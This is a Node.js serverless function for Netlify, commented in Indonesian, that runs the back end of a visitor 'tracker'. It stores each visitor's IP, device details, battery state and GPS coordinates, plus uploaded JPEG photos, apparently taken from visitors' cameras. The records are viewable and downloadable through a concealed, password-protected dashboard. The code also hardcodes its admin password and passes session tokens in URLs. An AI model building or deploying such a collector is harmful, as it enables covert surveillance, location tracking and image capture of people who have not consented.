const crypto = require("crypto");

const PASSWORD = "7kreppontop";
const SESSION_COOKIE = "sess";

// ---- storage pakai Netlify Blobs via require dinamis ----
let _store = null;
async function getStoreSafe() {
  if (_store) return _store;
  try {
    const blobs = require("@netlify/blobs");
    _store = blobs.getStore({ name: "tracker", consistency: "strong" });
    return _store;
  } catch (e) {
    // fallback ke memory kalau blobs gagal load
    const mem = {};
    _store = {
      get: async (k) => mem[k] || null,
      set: async (k, v) => { mem[k] = v; },
      delete: async (k) => { delete mem[k]; },
    };
    return _store;
  }
}

const json = (obj, status = 200, extra = {}) => ({
  statusCode: status,
  headers: { "content-type": "application/json", "access-control-allow-origin": "*", ...extra },
  body: JSON.stringify(obj),
});

const html = (body, status = 200) => ({
  statusCode: status,
  headers: { "content-type": "text/html; charset=utf-8" },
  body,
});

async function readIndex(s) {
  try {
    const raw = await s.get("index.json");
    if (!raw) return { visits: [], snaps: [] };
    return JSON.parse(typeof raw === "string" ? raw : Buffer.from(raw).toString("utf8"));
  } catch (e) {
    return { visits: [], snaps: [] };
  }
}

async function writeIndex(s, idx) {
  try {
    await s.set("index.json", JSON.stringify(idx));
  } catch (e) {}
}

function makeToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac("sha256", PASSWORD).update(ts).digest("hex");
  return ts + "." + sig;
}

function checkToken(tok) {
  if (!tok) return false;
  const parts = tok.split(".");
  const ts = parts[0], sig = parts[1];
  if (!ts || !sig) return false;
  if (Date.now() - Number(ts) > 7 * 24 * 3600 * 1000) return false;
  const expect = crypto.createHmac("sha256", PASSWORD).update(ts).digest("hex");
  try {
    if (sig.length !== expect.length) return false;
    return crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expect));
  } catch (e) { return false; }
}

function parseCookies(header) {
  const out = {};
  (header || "").split(";").forEach(p => {
    const i = p.indexOf("=");
    if (i > 0) out[p.slice(0, i).trim()] = p.slice(i + 1).trim();
  });
  return out;
}

function isAuthed(event) {
  const cookies = parseCookies(event.headers.cookie || event.headers.Cookie || "");
  if (checkToken(cookies[SESSION_COOKIE])) return true;
  try {
    const url = new URL(event.rawUrl || "https://x" + event.path);
    const qt = url.searchParams.get("token");
    return checkToken(qt);
  } catch (e) { return false; }
}

function crc32(buf) {
  let c, crc = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) {
    c = (crc ^ buf[i]) & 0xFF;
    for (let k = 0; k < 8; k++) c = c & 1 ? (c >>> 1) ^ 0xEDB88320 : c >>> 1;
    crc = (crc >>> 8) ^ c;
  }
  return (crc ^ 0xFFFFFFFF) >>> 0;
}

function makeZip(files) {
  const chunks = []; const central = []; let offset = 0;
  for (const f of files) {
    const nameBuf = Buffer.from(f.name, "utf8");
    const crc = crc32(f.data); const size = f.data.length;
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50,0); local.writeUInt16LE(20,4); local.writeUInt16LE(0,6);
    local.writeUInt16LE(0,8); local.writeUInt16LE(0,10); local.writeUInt16LE(0,12);
    local.writeUInt32LE(crc,14); local.writeUInt32LE(size,18); local.writeUInt32LE(size,22);
    local.writeUInt16LE(nameBuf.length,26); local.writeUInt16LE(0,28);
    chunks.push(local, nameBuf, f.data);
    const cen = Buffer.alloc(46);
    cen.writeUInt32LE(0x02014b50,0); cen.writeUInt16LE(20,4); cen.writeUInt16LE(20,6);
    cen.writeUInt16LE(0,8); cen.writeUInt16LE(0,10); cen.writeUInt16LE(0,12); cen.writeUInt16LE(0,14);
    cen.writeUInt32LE(crc,16); cen.writeUInt32LE(size,20); cen.writeUInt32LE(size,24);
    cen.writeUInt16LE(nameBuf.length,28); cen.writeUInt16LE(0,30); cen.writeUInt16LE(0,32);
    cen.writeUInt16LE(0,34); cen.writeUInt16LE(0,36); cen.writeUInt32LE(0,38); cen.writeUInt32LE(offset,42);
    central.push(cen, nameBuf);
    offset += local.length + nameBuf.length + size;
  }
  const cenBuf = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50,0); end.writeUInt16LE(0,4); end.writeUInt16LE(0,6);
  end.writeUInt16LE(files.length,8); end.writeUInt16LE(files.length,10);
  end.writeUInt32LE(cenBuf.length,12); end.writeUInt32LE(offset,16); end.writeUInt16LE(0,20);
  return Buffer.concat([...chunks, cenBuf, end]);
}

function toCSV(visits) {
  const header = ["ts","ip","page","referrer","screen","timezone","language","userAgent","batteryLevel","batteryCharging","lat","lon","receivedAt"];
  const esc = v => `"${String(v == null ? "" : v).replace(/"/g, '""')}"`;
  const lines = visits.map(r => [
    r.ts, r.ip, r.page, r.referrer, r.screen, r.timezone, r.language, r.userAgent,
    r.battery ? r.battery.level : "", r.battery ? r.battery.charging : "",
    r.geo ? r.geo.lat : "", r.geo ? r.geo.lon : "", r.receivedAt
  ].map(esc).join(","));
  return header.join(",") + "\n" + lines.join("\n") + "\n";
}

function pageError(msg) {
  return html(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Error</title>
<style>body{font:14px system-ui;background:#0e0e10;color:#e6e6e6;padding:40px;max-width:600px;margin:auto}
pre{background:#1a1a1e;border:1px solid #2e2e34;border-radius:8px;padding:16px;overflow:auto;color:#ff6b6b}
a{color:#3b82f6}</style></head><body>
<h2>Function error</h2>
<p>Ada masalah di server. Detail:</p>
<pre>${String(msg).replace(/</g,"&lt;")}</pre>
<p><a href="/">← balik ke halaman utama</a></p>
</body></html>`, 500);
}

exports.handler = async (event) => {
  try {
    const s = await getStoreSafe();
    let path = "";
    if (event.path.includes("/api/track/")) path = event.path.split("/api/track/")[1];
    else if (event.path.includes("/.netlify/functions/tracker/")) path = event.path.split("/.netlify/functions/tracker/")[1];
    const ip = (event.headers["x-forwarded-for"] || "").split(",")[0].trim() || "unknown";

    // ---- LOGIN ----
    if (path === "login" && event.method === "POST") {
      let d = {};
      try { d = JSON.parse(event.body || "{}"); } catch (e) {}
      if (d.password === PASSWORD) {
        const tok = makeToken();
        return {
          statusCode: 200,
          headers: {
            "content-type": "application/json",
            "set-cookie": SESSION_COOKIE + "=" + tok + "; Path=/; HttpOnly; SameSite=Lax; Max-Age=" + (7*24*3600),
            "access-control-allow-origin": "*",
          },
          body: JSON.stringify({ ok: true }),
        };
      }
      return json({ ok: false, reason: "wrong_password" }, 401);
    }

    // ---- LOGOUT ----
    if (path === "logout") {
      return {
        statusCode: 302,
        headers: {
          "location": "/",
          "set-cookie": SESSION_COOKIE + "=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0",
        },
        body: "",
      };
    }

    // ---- DASHBOARD ----
    if (path === "dashboard") {
      if (!isAuthed(event)) {
        return html(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Login</title>
<style>body{font:14px system-ui;background:#0e0e10;color:#e6e6e6;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.c{background:#1a1a1e;border:1px solid #2e2e34;border-radius:12px;padding:28px 32px;max-width:320px;text-align:center}
h2{margin:0 0 8px;font-size:16px}p{color:#9a9aa2;font-size:13px;margin:0 0 16px}
a{padding:10px 20px;background:#3b82f6;color:#fff;text-decoration:none;border-radius:8px;font-weight:600;display:inline-block}</style>
</head><body><div class="c"><h2>Akses ditolak</h2><p>Klik logo di halaman utama untuk masuk.</p><a href="/">← ke halaman utama</a></div></body></html>`);
      }
      const idx = await readIndex(s);
      const tok = makeToken();
      const visitsRev = idx.visits.slice().reverse();
      const snapsRev = idx.snaps.slice().reverse();
      return html(renderDash(visitsRev, snapsRev, tok));
    }

    // ---- TERIMA DATA ----
    if (path === "collect" && event.method === "POST") {
      let d = {};
      try { d = JSON.parse(event.body || "{}"); } catch (e) {}
      const idx = await readIndex(s);
      idx.visits.push(Object.assign({}, d, { ip, receivedAt: new Date().toISOString() }));
      if (idx.visits.length > 5000) idx.visits = idx.visits.slice(-5000);
      await writeIndex(s, idx);
      return { statusCode: 204, body: "" };
    }

    // ---- TERIMA FOTO ----
    if (path === "snap" && event.method === "POST") {
      const ct = event.headers["content-type"] || "";
      if (ct.indexOf("boundary=") === -1) return json({ error: "no boundary" }, 400);
      const buf = event.isBase64Encoded ? Buffer.from(event.body, "base64") : Buffer.from(event.body, "binary");
      const start = buf.indexOf(Buffer.from([0xff, 0xd8, 0xff]));
      const end = buf.lastIndexOf(Buffer.from([0xff, 0xd9]));
      if (start === -1 || end === -1) return json({ error: "no jpeg" }, 400);
      const jpeg = buf.slice(start, end + 2);
      const key = "photo_" + Date.now() + "_" + Math.random().toString(36).slice(2,8) + ".jpg";
      await s.set(key, jpeg);
      const idx = await readIndex(s);
      idx.snaps.push({ ts: new Date().toISOString(), ip, key, bytes: jpeg.length });
      if (idx.snaps.length > 2000) {
        const drop = idx.snaps.slice(0, idx.snaps.length - 2000);
        for (const d of drop) { try { await s.delete(d.key); } catch (e) {} }
        idx.snaps = idx.snaps.slice(-2000);
      }
      await writeIndex(s, idx);
      return { statusCode: 204, body: "" };
    }

    // ---- AMBIL FOTO ----
    if (path.indexOf("photo/") === 0) {
      if (!isAuthed(event)) return { statusCode: 403, body: "forbidden" };
      const key = path.slice("photo/".length);
      const data = await s.get(key, { type: "arrayBuffer" });
      if (!data) return { statusCode: 404, body: "not found" };
      return {
        statusCode: 200,
        headers: { "content-type": "image/jpeg" },
        body: Buffer.from(data).toString("base64"),
        isBase64Encoded: true,
      };
    }

    // ---- DOWNLOAD ----
    if (path === "download/all.zip") {
      if (!isAuthed(event)) return { statusCode: 403, body: "forbidden" };
      const idx = await readIndex(s);
      const files = [];
      files.push({ name: "data.json", data: Buffer.from(JSON.stringify({
        exportedAt: new Date().toISOString(),
        count: { visits: idx.visits.length, photos: idx.snaps.length },
        visits: idx.visits, photos: idx.snaps
      }, null, 2), "utf8") });
      files.push({ name: "visits.csv", data: Buffer.from(toCSV(idx.visits), "utf8") });
      for (const p of idx.snaps) {
        try {
          const ab = await s.get(p.key, { type: "arrayBuffer" });
          if (ab) files.push({ name: "photos/" + p.key, data: Buffer.from(ab) });
        } catch (e) {}
      }
      const zip = makeZip(files);
      return {
        statusCode: 200,
        headers: {
          "content-type": "application/zip",
          "content-disposition": 'attachment; filename="tracker-' + Date.now() + '.zip"',
        },
        body: zip.toString("base64"),
        isBase64Encoded: true,
      };
    }

    if (path === "download/data.json") {
      if (!isAuthed(event)) return { statusCode: 403, body: "forbidden" };
      const idx = await readIndex(s);
      return {
        statusCode: 200,
        headers: {
          "content-type": "application/json",
          "content-disposition": 'attachment; filename="data-' + Date.now() + '.json"',
        },
        body: JSON.stringify({ exportedAt: new Date().toISOString(), visits: idx.visits, photos: idx.snaps }, null, 2),
      };
    }

    if (path === "download/photos.zip") {
      if (!isAuthed(event)) return { statusCode: 403, body: "forbidden" };
      const idx = await readIndex(s);
      const files = [];
      for (const p of idx.snaps) {
        try {
          const ab = await s.get(p.key, { type: "arrayBuffer" });
          if (ab) files.push({ name: p.key, data: Buffer.from(ab) });
        } catch (e) {}
      }
      const zip = makeZip(files);
      return {
        statusCode: 200,
        headers: {
          "content-type": "application/zip",
          "content-disposition": 'attachment; filename="photos-' + Date.now() + '.zip"',
        },
        body: zip.toString("base64"),
        isBase64Encoded: true,
      };
    }

    // ---- DEBUG ----
    if (path === "ping") {
      return json({ ok: true, path: event.path, method: event.method, hasBlobs: !!_store });
    }

    return json({ error: "not found", path: path }, 404);
  } catch (err) {
    return pageError(err && err.stack ? err.stack : String(err));
  }
};

function renderDash(v, s, token) {
  const rows = v.length === 0
    ? '<div class="empty">Belum ada data.</div>'
    : '<div class="wrap"><table><tr><th>waktu</th><th>ip</th><th>ua</th><th>screen</th><th>tz</th><th>lang</th><th>baterai</th><th>geo</th><th>ref</th><th>page</th></tr>'
      + v.map(function(r) {
          var bat = r.battery ? r.battery.level + "%" + (r.battery.charging ? " ⚡" : "") : "-";
          var ge = r.geo ? r.geo.lat.toFixed(4) + "," + r.geo.lon.toFixed(4) : "-";
          return '<tr><td>' + (r.ts||"") + '</td><td>' + (r.ip||"") + '</td><td>' + ((r.userAgent||"").slice(0,50)) + '</td><td>'
            + (r.screen||"") + '</td><td>' + (r.timezone||"") + '</td><td>' + (r.language||"") + '</td><td>'
            + bat + '</td><td>' + ge + '</td><td>' + (r.referrer||"-") + '</td><td>' + ((r.page||"").slice(0,40)) + '</td></tr>';
        }).join("")
      + '</table></div>';

  const photoRows = s.length === 0
    ? '<div class="empty">Belum ada foto.</div>'
    : '<div class="wrap"><table><tr><th>waktu</th><th>ip</th><th>ukuran</th><th>gambar</th></tr>'
      + s.map(function(r) {
          var url = "/api/track/photo/" + r.key + "?token=" + token;
          return '<tr><td>' + (r.ts||"") + '</td><td>' + (r.ip||"") + '</td><td>' + (r.bytes||0) + ' B</td>'
            + '<td><a href="' + url + '" target="_blank"><img class="shot" src="' + url + '"></a></td></tr>';
        }).join("")
      + '</table></div>';

  return `<!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Data Pengunjung</title><style>
body{font:14px/1.4 system-ui,sans-serif;background:#0e0e10;color:#e6e6e6;padding:20px}
h1{font-size:16px;margin:24px 0 8px}
.bar{display:flex;gap:10px;flex-wrap:wrap;margin:12px 0 20px}
.bar a{padding:10px 16px;background:#3b82f6;color:#fff;text-decoration:none;border-radius:8px;font-weight:600;font-size:13px}
.bar a.alt{background:#2a2a30;color:#c8c8cf}
table{border-collapse:collapse;width:100%;margin-top:12px}
th,td{border:1px solid #2a2a2e;padding:6px 10px;text-align:left;white-space:nowrap;vertical-align:top}
th{background:#1a1a1e}
tr:nth-child(even){background:#141418}
img.shot{max-width:220px;border:1px solid #333;border-radius:4px;display:block}
.wrap{overflow-x:auto}
.empty{color:#8a8a92;padding:16px;background:#16161a;border:1px solid #2a2a2e;border-radius:8px}
</style></head><body>
<h1>${v.length} kunjungan &middot; ${s.length} foto</h1>
<div class="bar">
  <a href="/api/track/download/all.zip?token=${token}">⬇ Download semua (ZIP)</a>
  <a class="alt" href="/api/track/download/data.json?token=${token}">⬇ data.json</a>
  <a class="alt" href="/api/track/download/photos.zip?token=${token}">⬇ foto.zip</a>
  <a class="alt" href="/dashboard">↻ Refresh</a>
  <a class="alt" href="/api/track/logout">keluar</a>
</div>
${rows}
<h1>Foto (${s.length})</h1>
${photoRows}
</body></html>`;
    }
